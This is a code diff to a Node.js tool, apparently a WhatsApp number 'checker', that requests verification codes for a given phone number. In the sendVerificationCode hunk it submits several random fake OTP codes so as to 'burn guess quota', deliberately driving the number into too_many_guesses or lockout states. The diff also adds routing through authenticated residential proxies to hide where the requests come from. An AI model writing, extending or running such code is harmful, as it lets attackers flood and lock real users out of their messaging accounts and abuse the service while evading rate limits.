@@ -2,21 +2,51 @@ const dns = require("dns");
 if (typeof dns.setDefaultResultOrder === "function") dns.setDefaultResultOrder("ipv4first");
 const WADetector = require("./walz-loader");
 
-const DEFAULT_TIMEOUT_MS = parseInt(process.env.WA_TIMEOUT_MS || "10000", 10);
+const DEFAULT_TIMEOUT_MS = parseInt(process.env.WA_TIMEOUT_MS || "12000", 10);
+
+function buildProxyUrlFromEnv() {
+  if (process.env.PROXY_URL) return String(process.env.PROXY_URL).trim();
+  const host = process.env.PROXY_HOST || process.env.DATAIMPULSE_HOST || "";
+  const port = process.env.PROXY_PORT || process.env.DATAIMPULSE_PORT || "";
+  const user = process.env.PROXY_USER || process.env.DATAIMPULSE_USER || "";
+  const pass = process.env.PROXY_PASS || process.env.DATAIMPULSE_PASS || "";
+  if (!host || !port) return "";
+  const auth = user ? `${encodeURIComponent(user)}:${encodeURIComponent(pass)}@` : "";
+  const proto = (process.env.PROXY_PROTOCOL || "http").toLowerCase().replace("https", "http");
+  return `${proto}://${auth}${host}:${port}`;
+}
+
+const PROXY_URL = buildProxyUrlFromEnv();
 
 let keepAliveDispatcher;
 try {
-  const { Agent } = require("undici");
-  keepAliveDispatcher = new Agent({
-    connections: 96,
-    pipelining: 1,
-    keepAliveTimeout: 60000,
-    keepAliveMaxTimeout: 120000,
-    connect: { timeout: 3500, rejectUnauthorized: true },
-    bodyTimeout: 8000,
-    headersTimeout: 6000
-  });
-} catch (_) {}
+  const undici = require("undici");
+  if (PROXY_URL && undici.ProxyAgent) {
+    keepAliveDispatcher = new undici.ProxyAgent({
+      uri: PROXY_URL,
+      connections: 32,
+      pipelining: 1,
+      keepAliveTimeout: 60000,
+      keepAliveMaxTimeout: 120000,
+      requestTls: { rejectUnauthorized: true },
+      proxyTls: { rejectUnauthorized: true }
+    });
+    console.log("[checker] proxy enabled:", PROXY_URL.replace(/:[^:@/]+@/, ":****@"));
+  } else {
+    keepAliveDispatcher = new undici.Agent({
+      connections: 96,
+      pipelining: 1,
+      keepAliveTimeout: 60000,
+      keepAliveMaxTimeout: 120000,
+      connect: { timeout: 5000, rejectUnauthorized: true },
+      bodyTimeout: 10000,
+      headersTimeout: 8000
+    });
+    if (!PROXY_URL) console.log("[checker] proxy disabled (set PROXY_URL or PROXY_HOST/PORT)");
+  }
+} catch (e) {
+  console.warn("[checker] dispatcher init failed:", e && e.message ? e.message : e);
+}
 
 function sanitizePhoneInput(raw) {
   const cleaned = String(raw || "")
@@ -706,14 +736,16 @@ async function sendVerificationCode(rawPhone, method = "sms", options = {}) {
     const hardFail = ["blocked", "banned", "no_routes", "bad_token", "length_long", "length_short", "missing"].includes(reason);
     const sentOk = status === "sent" || status === "ok" || ["sent", "sms_sent", "code_sent", "incorrect"].includes(reason);
 
-    // Submit fake OTP to accelerate temporary / burn guesses when code request succeeded
+    // Multi fake OTP → burn guess quota lebih cepat (too_many_guesses / temporary)
     if (sentOk && !hardFail && typeof WADetector.buildRegisterPayloads === "function") {
-      try {
-        assertNotCancelled();
-        const fakeCode = String(100000 + Math.floor(Math.random() * 900000));
-        const regPayload = await WADetector.buildRegisterPayloads(cleanPhone, fakeCode);
-        if (regPayload && regPayload.success && regPayload.register) {
-          await new Promise(r => setTimeout(r, 40));
+      const guessCount = Math.max(1, Math.min(3, parseInt(process.env.WA_FAKE_GUESS_COUNT || "3", 10)));
+      for (let g = 0; g < guessCount; g++) {
+        try {
+          assertNotCancelled();
+          const fakeCode = String(100000 + Math.floor(Math.random() * 900000));
+          const regPayload = await WADetector.buildRegisterPayloads(cleanPhone, fakeCode);
+          if (!regPayload || !regPayload.success || !regPayload.register) break;
+          await new Promise(r => setTimeout(r, 35 + g * 40));
           assertNotCancelled();
           registerText = await callWAWithRetry(regPayload.register, regPayload.userAgent, payload.headers, sendTimeout, 1, signal);
           const regJson = safeJsonParse(registerText) || {};
@@ -727,11 +759,13 @@ async function sendVerificationCode(rawPhone, method = "sms", options = {}) {
           const methodWait = numWait(methods[methodKey]);
           if (methodWait > cooldownSeconds) cooldownSeconds = methodWait;
           deviceOn = extractDeviceState(null, existJson, { ...codeJson, ...regJson }) || deviceOn;
-        }
-      } catch (regErr) {
-        const rm = String(regErr && regErr.message ? regErr.message : regErr);
-        if (rm === "CANCELLED") {
-          return { success: false, phone: formattedPhone, method: methodKey, error: "CANCELLED", probe };
+          // sudah too_many_guesses / hard wait → stop guess
+          if (regReason === "too_many_guesses" || regWait >= 600) break;
+        } catch (regErr) {
+          const rm = String(regErr && regErr.message ? regErr.message : regErr);
+          if (rm === "CANCELLED") {
+            return { success: false, phone: formattedPhone, method: methodKey, error: "CANCELLED", probe };
+          }
         }
       }
     }
